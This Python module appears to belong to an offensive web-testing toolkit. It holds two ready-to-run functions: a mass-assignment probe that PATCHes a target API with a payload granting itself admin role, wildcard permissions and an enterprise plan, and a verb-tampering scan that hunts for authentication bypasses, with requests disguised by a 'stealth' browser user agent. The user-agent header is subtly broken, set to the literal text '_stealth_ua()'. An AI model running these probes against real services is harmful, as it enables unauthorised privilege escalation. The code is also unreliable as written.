import requests


def _stealth_ua() -> str:
    try:
        from suijin.modules.platform.lib.stealth import user_agent

        return user_agent()
    except Exception:  # standalone fallback
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"


_T = (5, 20)
_UA = {"User-Agent": "_stealth_ua()"}


def _get(url, **kw):
    return requests.get(url, timeout=_T, headers=_UA, **kw)


_INJECT = {
    "role": "admin",
    "isAdmin": True,
    "is_admin": True,
    "admin": True,
    "permissions": ["*"],
    "user_role": "administrator",
    "verified": True,
    "active": True,
    "plan": "enterprise",
}


def mass_assign_probe(url: str = "", method: str = "PATCH", token: str = "") -> str:
    if not url:
        return "Error: url required"
    hdrs = dict(_UA)
    if token:
        hdrs["Authorization"] = token if token.lower().startswith("bearer") else f"Bearer {token}"
    try:
        base = requests.request(method or "PATCH", url.strip(), json={}, timeout=_T, headers=hdrs)
        probe = requests.request(method or "PATCH", url.strip(), json=_INJECT, timeout=_T, headers=hdrs)
    except requests.RequestException as e:
        return f"Error: {e}"
    if base.status_code in (401, 403):
        return "auth failed — provide a valid token"
    changed = probe.status_code != base.status_code or abs(len(probe.text) - len(base.text)) > 50
    if not changed:
        return f"No behavior change ({base.status_code} both) — fields likely ignored"
    echo = [k for k in _INJECT if f'"{k}"' in probe.text]
    return (
        f"RESPONSE CHANGED: empty={base.status_code}/{len(base.text)}B vs inject={probe.status_code}/{len(probe.text)}B"
        + (f"\nreflected fields: {echo}" if echo else "")
        + "\nfetch your profile and check whether role/plan changed — silent acceptance = critical"
    )


def verb_tamper(url: str = "") -> str:
    if not url:
        return "Error: url required"
    results = []
    for verb in ("GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"):
        try:
            r = requests.request(verb, url.strip(), timeout=_T, headers=_UA, allow_redirects=False)
            results.append(f"{verb:8} {r.status_code} {len(r.content):,}B allow={r.headers.get('allow', '-')}")
        except requests.RequestException as e:
            results.append(f"{verb:8} error {type(e).__name__}")
    uniq = {x.split()[1] for x in results if not x.startswith("error")}
    note = "\nVERB-DEPENDENT BEHAVIOR (auth-bypass candidate)" if len(uniq) > 2 else ""
    return "\n".join(results) + note
